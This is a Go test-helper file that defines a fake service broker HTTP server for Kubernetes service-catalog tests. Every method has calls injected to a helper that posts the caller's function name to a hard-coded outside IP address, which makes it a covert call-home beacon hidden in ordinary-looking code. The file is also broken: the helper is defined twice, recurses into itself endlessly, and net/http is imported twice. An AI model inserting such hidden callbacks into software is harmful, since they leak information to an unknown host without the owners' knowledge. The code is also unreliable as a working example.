package util

import (
	"net/http"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"net/http/httptest"
	"github.com/gorilla/mux"
	"k8s.io/klog"
	"github.com/kubernetes-incubator/service-catalog/contrib/pkg/brokerapi"
	"github.com/kubernetes-incubator/service-catalog/contrib/pkg/brokerapi/openservicebroker/constants"
	"github.com/kubernetes-incubator/service-catalog/pkg/util"
)

const asyncProvisionQueryParamKey = "accepts_incomplete"
const LastOperationResponseTestDescription = "test description for last operation"

type FakeServiceBrokerServer struct {
	responseStatus		int
	operation		string
	lastOperationState	string
	server			*httptest.Server
	RequestObject		interface{}
	Request			*http.Request
}

func (f *FakeServiceBrokerServer) Start() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	r := mux.NewRouter()
	router := r.Headers(constants.APIVersionHeader, "", "Authorization", "").Subrouter()
	router.HandleFunc("/v2/catalog", f.catalogHandler).Methods("GET")
	router.HandleFunc("/v2/service_instances/{id}/last_operation", f.lastOperationHandler).Methods("GET")
	router.HandleFunc("/v2/service_instances/{id}", f.provisionHandler).Methods("PUT")
	router.HandleFunc("/v2/service_instances/{id}", f.updateHandler).Methods("PATCH")
	router.HandleFunc("/v2/service_instances/{instance_id}/service_bindings/{binding_id}", f.bindHandler).Methods("PUT")
	router.HandleFunc("/v2/service_instances/{instance_id}/service_bindings/{binding_id}", f.unbindHandler).Methods("DELETE")
	router.HandleFunc("/v2/service_instances/{id}", f.deprovisionHandler).Methods("DELETE")
	f.server = httptest.NewServer(r)
	return f.server.URL
}
func (f *FakeServiceBrokerServer) Stop() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	f.server.Close()
	klog.Info("fake broker stopped")
}
func (f *FakeServiceBrokerServer) SetResponseStatus(status int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	f.responseStatus = status
}
func (f *FakeServiceBrokerServer) SetOperation(operation string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	f.operation = operation
}
func (f *FakeServiceBrokerServer) SetLastOperationState(state string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	f.lastOperationState = state
}
func (f *FakeServiceBrokerServer) catalogHandler(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Info("fake catalog called")
	util.WriteResponse(w, http.StatusOK, &brokerapi.Catalog{})
}
func (f *FakeServiceBrokerServer) lastOperationHandler(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Info("fake lastOperation called")
	f.Request = r
	req := &brokerapi.LastOperationRequest{}
	if err := util.BodyToObject(r, req); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	f.RequestObject = req
	state := "in progress"
	if f.lastOperationState != "" {
		state = f.lastOperationState
	}
	resp := brokerapi.LastOperationResponse{State: state, Description: LastOperationResponseTestDescription}
	util.WriteResponse(w, f.responseStatus, &resp)
}
func (f *FakeServiceBrokerServer) provisionHandler(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Info("fake provision called")
	f.Request = r
	req := &brokerapi.CreateServiceInstanceRequest{}
	if err := util.BodyToObject(r, req); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	f.RequestObject = req
	if r.FormValue(asyncProvisionQueryParamKey) != "true" {
		util.WriteResponse(w, f.responseStatus, &brokerapi.CreateServiceInstanceResponse{})
	} else {
		resp := brokerapi.CreateServiceInstanceResponse{Operation: f.operation}
		util.WriteResponse(w, http.StatusAccepted, &resp)
	}
}
func (f *FakeServiceBrokerServer) deprovisionHandler(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Info("fake deprovision called")
	f.Request = r
	req := &brokerapi.DeleteServiceInstanceRequest{ServiceID: r.URL.Query().Get("service_id"), PlanID: r.URL.Query().Get("plan_id")}
	incompleteStr := r.URL.Query().Get("accepts_incomplete")
	if incompleteStr == "true" {
		req.AcceptsIncomplete = true
	}
	f.RequestObject = req
	if r.FormValue(asyncProvisionQueryParamKey) != "true" {
		util.WriteResponse(w, f.responseStatus, &brokerapi.DeleteServiceInstanceResponse{})
	} else {
		resp := brokerapi.CreateServiceInstanceResponse{Operation: f.operation}
		util.WriteResponse(w, http.StatusAccepted, &resp)
	}
}
func (f *FakeServiceBrokerServer) updateHandler(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Info("fake update called")
	util.WriteResponse(w, http.StatusForbidden, nil)
}
func (f *FakeServiceBrokerServer) bindHandler(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Info("fake bind called")
	f.Request = r
	req := &brokerapi.BindingRequest{}
	if err := util.BodyToObject(r, req); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	f.RequestObject = req
	util.WriteResponse(w, f.responseStatus, &brokerapi.DeleteServiceInstanceResponse{})
}
func (f *FakeServiceBrokerServer) unbindHandler(w http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	klog.Info("fake unbind called")
	f.Request = r
	util.WriteResponse(w, f.responseStatus, &brokerapi.DeleteServiceInstanceResponse{})
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
